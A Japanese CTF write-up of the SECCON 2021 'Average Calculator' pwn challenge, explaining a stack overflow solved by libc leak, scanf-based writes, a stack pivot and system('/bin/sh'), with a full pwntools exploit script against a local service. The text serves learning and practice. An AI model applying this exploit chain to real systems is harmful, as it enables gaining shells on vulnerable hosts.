+++
title = "SECCON CTF 2021 - Average Calculator"
date = 2022-06-27

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "Stack Pivot"]
+++


- 問題ファイル: [SECCON2021_online_CTF/pwnable/Average_Calculator at main · SECCON/SECCON2021_online_CTF](https://github.com/SECCON/SECCON2021_online_CTF/tree/main/pwnable/Average_Calculator)

## TL;DR

- 任意長のSBOFがあるが、書き込める数値が小さく、バイナリ中のコードを使ったROPしか出来ない
- `"%s"`をバイナリ中に書き込んで自由な入力が`scanf`で出来るようにし、適当なwritableな領域に偽のスタックを書き込んでstack pivotする

## Prerequisite

- stack pivot

## Writeup

次のコード(C言語)をコンパイルしたバイナリが動いている

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    long long n, i;
    long long A[16];
    long long sum, average;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("n: ");
    if (scanf("%lld", &n)!=1)
        exit(0);
    for (i=0; i<n; i++)
    {
        printf("A[%lld]: ", i);
        if (scanf("%lld", &A[i])!=1)
            exit(0);
        //  prevent integer overflow in summation
        if (A[i]<-123456789LL || 123456789LL<A[i])
        {
            printf("too large\n");
            exit(0);
        }
    }

    sum = 0;
    for (i=0; i<n; i++)
        sum += A[i];
    average = (sum+n/2)/n;
    printf("Average = %lld\n", average);
}

```

`checksec`した結果は次の通り

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

最初に、入力する数値の数`n`を与えて、その後に`n`だけ数値を入力してその平均値を計算するというプログラムである。

`n`は特に制限が無く、その後に入力する数値はスタック上の配列に格納されるので任意長のスタックオーバーフローが存在する。

というわけで「やるだけじゃん」だと思うが、実は次のような罠がある

```c
        //  prevent integer overflow in summation
        if (A[i]<-123456789LL || 123456789LL<A[i])
        {
            printf("too large\n");
            exit(0);
        }
```

このせいで小さい数値しか書き込むことが出来ず、`puts`でどこかのGOT経由でlibcのアドレスを開示し、ret2mainで再びBOFをしてlibcのアドレスをスタックに書き込んで、リターンアドレスに設定するという事は出来ない。

PIEが無効なのでバイナリのアドレスは小さく(`0x400000`程度)、バイナリのコード片でROPは出来ることから、`puts`でどこかのGOTを開示してlibcのアドレスを得ることは出来る。

更に`scanf`のような入力関数があるので[TSGCTF 2021 - coffee](https://project-euphoria.dev/problems/2022-06-14/)みたいにROPチェーンの末尾に`scanf`をくっつけて、開示したlibcのアドレスを元にwritableな領域を偽のスタックとした新たなROPチェーンを書き込んでstack pivotをすれば良い。

手順は次の通り

1. `puts(puts@got)`でlibc leakする
2. 後に`scanf("%s", <addr>)`でROPチェーンを書き込むために`%s`をバイナリ中に書き込む
	1. `"%lld"`はバイナリ中に存在するので`scanf("%lld", <addr>)`をROPで呼んで適当なwritableな場所に`"%s"`を書き込む(数値として高々65536なので`%lld`が使える)
3. 後に`system("/bin/sh")`をするために`"/bin/sh"`を`scanf("%s", <addr>)`でバイナリ中に書き込む
4. バイナリ中の適当なwritableな領域(今回は0x404800を使用)に続きのROPチェーンを書き込む
5. stack pivotする(`pop rbp; ret; leave; ret`を使った)
6. 4で書いたROPチェーンで`system("/bin/sh")`を実行する

## Code

```python
from pwn import process, remote, ELF, u64, p64


def dump_hex_dict(d):
    for k, addr in d.items():
        print(f"{k}: {hex(addr)}")

def send_num(n):
    sc.recvuntil(b"]")
    sc.sendline(str(n).encode())

elf_path = "./average"
elf = ELF(elf_path)
libc_path = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
libc = ELF(libc_path)

addrs = {
    "%lld": next(elf.search(b"%lld")),
    "%s": 0x404100,
    "/bin/sh": 0x404110,
    "scanf_plt": elf.plt["__isoc99_scanf"],
    "puts_plt": elf.plt["puts"],
    "puts_got": elf.got["puts"],
    "puts_libc": libc.symbols["puts"],
    "fake_stack": 0x404800
}

rpg = {
    "pop_rdi": 0x4013a3,
    "pop_rsi_r15": 0x4013a1,
    "pop_rbp": 0x40115d,
    "leave": 0x40133e,  # mov rsp, rbp; pop rbp
    "ret": 0x40101a
}

dump_hex_dict(addrs)
dump_hex_dict(rpg)


payload = [i+1 for i in range(16)]
payload += [-1, 0, 0, 19, 0]

rop_payload = [
    # libc leak
    rpg["pop_rdi"],
    addrs["puts_got"],
    addrs["puts_plt"],
    # write `%s` to bss
    rpg["pop_rdi"],
    addrs["%lld"],
    rpg["pop_rsi_r15"],
    addrs["%s"],
    0,
    rpg["ret"],
    addrs["scanf_plt"],
    # write `/bin/sh` to bss
    rpg["pop_rdi"],
    addrs["%s"],
    rpg["pop_rsi_r15"],
    addrs["/bin/sh"],
    0,
    addrs["scanf_plt"],
    # write rop chain to fake stack
    rpg["pop_rdi"],
    addrs["%s"],
    rpg["pop_rsi_r15"],
    addrs["fake_stack"],
    0,
    addrs["scanf_plt"],
    # stack pivot
    rpg["pop_rbp"],
    addrs["fake_stack"],
    rpg["leave"]
]

payload += rop_payload

n = len(payload)
payload[16] = n

sc = remote("localhost", 13337)

# input("[+] Attach")

sc.recvuntil(b"n: ")
sc.sendline(str(n).encode())

for i, _n in enumerate(payload):
    send_num(_n)

sc.recvuntil(b"=")
res = sc.recvline()
print("ave:", res)

# libc leak
res = sc.recvline().strip()
leak = u64(res + b"\x00" * 2)
libc_addr = leak - addrs["puts_libc"]
print(hex(libc_addr))

addrs["system_libc"] = libc.symbols["system"] + libc_addr

# write `%s` to bss
percent_s = int.from_bytes(b"%s", "little")
sc.sendline(str(percent_s).encode())

# write `/bin/sh` to bss
sc.sendline(b"/bin/sh")

# write rop chain
payload = p64(addrs["fake_stack"] + 0x300)  # new rbp
payload += p64(rpg["pop_rdi"])
payload += p64(addrs["/bin/sh"])
payload += p64(rpg["ret"])
payload += p64(addrs["system_libc"])

if b"\x20" in payload:
    print("damedayo")
    exit()

print("[+] ROP")
sc.sendline(payload)

sc.interactive()
```

## Flag

ローカルでやっただけなのでなし

## References

- [Average Calculator (pwnable, 56 teams solved) - HackMD](https://hackmd.io/@kusano/ryg0SnQct): 作問者Writeup(英語、コード付き)
- [SECCON CTF 2021作問者writeup＋作問した感想 - kusano_k’s blog](https://kusano-k.hatenablog.com/entry/2021/12/23/014312): 作問感想
	- Full RELROでも解けるらしいので(Full RELROでコンパイルはしてないが)、GOT Overwriteをせずに解いた
